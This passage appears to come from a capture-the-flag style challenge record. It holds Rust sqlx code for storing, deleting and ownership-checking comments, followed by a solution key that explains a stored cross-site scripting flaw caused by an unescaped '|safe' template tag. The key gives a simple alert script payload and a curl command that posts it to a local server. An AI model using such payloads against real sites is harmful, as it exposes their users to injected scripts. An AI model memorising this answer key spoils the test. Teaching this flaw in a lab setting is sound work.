(content, authorId)\n            VALUES (?, ?)\n            \",\n            content,\n            author_id\n        )\n        .execute(pool)\n        .await?;\n        Ok(())\n    }\n\n    pub async fn delete(pool: &Pool<Sqlite>, id: i64) -> sqlx::Result<()> {\n        sqlx::query!(\n            \"\n            DELETE FROM comment\n            WHERE id = ?\n            \",\n            id\n        )\n        .execute(pool)\n        .await?;\n        Ok(())\n    }\n\n    pub async fn is_owned_by(\n        pool: &Pool<Sqlite>,\n        comment_id: i64,\n        user_id: i64,\n    ) -> sqlx::Result<bool> {\n        Ok(sqlx::query!(\n            \"\n            SELECT COUNT(*) AS count\n            FROM comment\n            WHERE id = ? AND authorId = ?\n            \",\n            comment_id,\n            user_id\n        )\n        .fetch_one(pool)\n        .await?\n        .count\n            > 0)\n    }\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **comment injection** vulnerability in the web application to execute arbitrary JavaScript code.\n\n### Steps to Exploit:\n1. **Understand the Vulnerability:**\n   - The application allows users to post comments with HTML formatting using the `{{ comment.content|safe }}` template tag.\n   - This means that any HTML or JavaScript code injected into the comment will be rendered as-is, leading to a potential **Cross-Site Scripting (XSS)** vulnerability.\n\n2. **Injecting Malicious Code:**\n   - To exploit this vulnerability, we can inject a `<script>` tag into the comment content.\n   - For example, we can use the following payload:\n     ```html\n     <script>alert('XSS');</script>\n     ```\n   - When another user views this comment, the script will execute and display an alert box with the message 'XSS'.\n\n3. **Using Curl or Postman:**\n   - You can use tools like Curl or Postman to send a POST request with the malicious payload:\n     ```bash\n     curl -X POST -d \"content=<script>alert('XSS');</script>\" http://localhost:8000/comments/create\n     ```\n   - This should create a new comment with the injected script.\n\n4. **Viewing the Comment:**\n   - When another user views the comments section, they will see the alert pop up, indicating that the XSS vulnerability has been successfully exploited."
	}
}